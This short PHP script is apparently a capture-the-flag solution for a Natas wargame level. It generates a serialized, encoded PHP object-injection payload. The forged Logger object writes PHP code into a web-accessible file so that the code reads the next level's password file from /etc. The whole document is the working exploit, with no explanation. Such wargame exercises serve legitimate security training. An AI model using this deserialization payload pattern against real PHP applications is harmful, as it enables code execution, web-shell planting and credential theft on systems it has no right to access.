<?
class Logger{
    private $logFile="img/yoooo.php";
    private $initMsg="<?php include('/etc/natas_webpass/natas27'); ?> ";
    private $exitMsg="<?php include('/etc/natas_webpass/natas27'); ?>";

    function __construct($file){
    }
    function log($msg){
    }
    function __destruct(){
    }
}
echo urlencode(base64_encode(serialize(new Logger(""))));
?>
